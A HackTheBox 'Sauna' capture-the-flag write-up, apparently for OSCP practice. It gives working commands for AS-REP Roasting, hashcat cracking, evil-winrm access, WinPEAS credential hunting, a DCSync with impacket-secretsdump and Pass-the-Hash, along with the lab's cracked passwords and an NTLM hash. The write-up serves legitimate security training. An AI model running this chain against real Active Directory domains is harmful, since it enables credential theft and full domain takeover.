# HTB - Sauna

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078d4?style=flat-square&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![AD](https://img.shields.io/badge/Category-Active%20Directory-blueviolet?style=flat-square)

> A Windows Domain Controller where employee names harvested from a bank website fuel AS-REP Roasting, WinPEAS uncovers AutoLogon credentials for a service account with pre-assigned DCSync rights, leading to a full domain compromise via Pass-the-Hash.

---

## Summary

Sauna is a Windows Domain Controller hosting the Egotistical Bank web application. RPC null sessions are blocked, so usernames are harvested from the website's Meet the Team page and converted into AD username format. AS-REP Roasting yields a hash for `fsmith` which cracks to `Thestrokes23`. After landing a WinRM shell, WinPEAS discovers AutoLogon credentials stored in plaintext in the registry for `svc_loanmgr`. BloodHound confirms this account has `GetChanges` and `GetChangesAll` on the domain object — the exact two rights needed for DCSync. A direct secretsdump dumps the Administrator hash which is used for a Pass-the-Hash shell to root.

---

## Attack Path

```
Nmap → DC with web app identified (IIS port 80 + Kerberos port 88)
  ↓
Web app → Meet the Team page → 6 employee names harvested
  ↓
Username wordlist → firstinitial + lastname convention
  ↓
AS-REP Roasting (GetNPUsers) → fsmith hash captured
  ↓
Hashcat (mode 18200) → Thestrokes23
  ↓
evil-winrm → shell as fsmith [USER FLAG]
  ↓
WinPEAS → AutoLogon credentials in registry → svc_loanmgr
  ↓
BloodHound → svc_loanmgr has GetChanges + GetChangesAll on domain
  ↓
impacket-secretsdump → DCSync → Administrator NTLM dumped
  ↓
evil-winrm Pass-the-Hash → Administrator [ROOT FLAG]
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV --min-rate 1000 -oA sauna 10.129.95.180
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Ports 88 and 389 confirm a Domain Controller. Port 80 reveals a web application. Port 5985 is open for WinRM. SMB signing is required, ruling out relay attacks.

### Web Application

Browsed to `http://10.129.95.180`. The Egotistical Bank site has a Meet the Team page listing 6 employees:

```
Fergus Smith, Hugo Bear, Steven Kerb
Shaun Coins, Bowie Taylor, Sophie Driver
```

RPC null sessions returned `NT_STATUS_ACCESS_DENIED`, making the web app the primary username source.

### Username Generation

Common AD naming conventions were tested. The format `firstinitial + lastname` matched the domain:

```
fsmith, hbear, skerb, scoins, btaylor, sdriver
```

---

## Exploitation

### AS-REP Roasting

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -dc-ip 10.129.95.180 -no-pass -format hashcat
```

`fsmith` returned a `$krb5asrep$23$` hash. Pre-authentication was disabled on this account.

### Hash Cracking

```bash
hashcat -m 18200 sauna_hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Credentials:** `fsmith : Thestrokes23`

### Initial Shell

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```

**User flag captured.**

---

## Privilege Escalation

### WinPEAS

```powershell
upload /usr/share/peass/winpeas/winPEASx64.exe
.\.winPEASx64.exe
```

WinPEAS found AutoLogon credentials stored in plaintext in the Windows registry:

```
DefaultUserName: EGOTISTICALBANK\svc_loanmanager
DefaultPassword: Moneymakestheworldgoround!
```

The actual AD account name is `svc_loanmgr`.

### BloodHound Analysis

```bash
bloodhound-python -u fsmith -p Thestrokes23 -d EGOTISTICAL-BANK.LOCAL -dc sauna.EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c all
```

BloodHound showed no direct path from `fsmith` to Domain Admins. However, expanding Outbound Object Control for `svc_loanmgr` revealed:

```
svc_loanmgr → GetChanges → EGOTISTICAL-BANK.LOCAL
svc_loanmgr → GetChangesAll → EGOTISTICAL-BANK.LOCAL
```

These are the exact two replication rights required for DCSync. No ACL manipulation needed.

### DCSync

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180
```

**Administrator NTLM:** `823452073d75b9d1cf70ebdf86c7f98e`

### Pass the Hash

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

**Root flag captured.**

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| AS-REP Roasting | fsmith (preauth disabled) | Offline hash crack |
| AutoLogon credentials in registry | Windows registry | Plaintext credential exposure |
| DCSync rights pre-assigned | svc_loanmgr account | Full domain credential dump |
| Pass the Hash | Administrator NTLM hash | Full system access |

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning |
| Browser | Employee name harvesting |
| impacket-GetNPUsers | AS-REP Roasting |
| hashcat | Hash cracking (mode 18200) |
| evil-winrm | Windows remote shell |
| WinPEAS | Local enumeration and credential hunting |
| bloodhound-python | AD data collection |
| BloodHound CE | ACL and privilege path analysis |
| impacket-secretsdump | DCSync |

---

## Key Takeaways

- Port 80 on a DC is a username harvesting opportunity. Browse every page before assuming you need other enumeration methods
- When RPC null sessions are blocked, web apps, Kerbrute, and OSINT fill the gap
- Always generate multiple username format variations. The wrong format means a missed hash
- WinPEAS AutoLogon is high value. Credentials stored there are plaintext and often belong to privileged service accounts
- BloodHound pathfinding not finding a path does not mean dead end. Always check Outbound Object Control manually
- GetChanges and GetChangesAll on the domain object mean DCSync with no further steps needed
- Pass-the-Hash with evil-winrm `-H` is always faster than cracking. Try it first

---

*Part of my OSCP preparation journey. Repo: [github.com/mavhezha](https://github.com/mavhezha)*
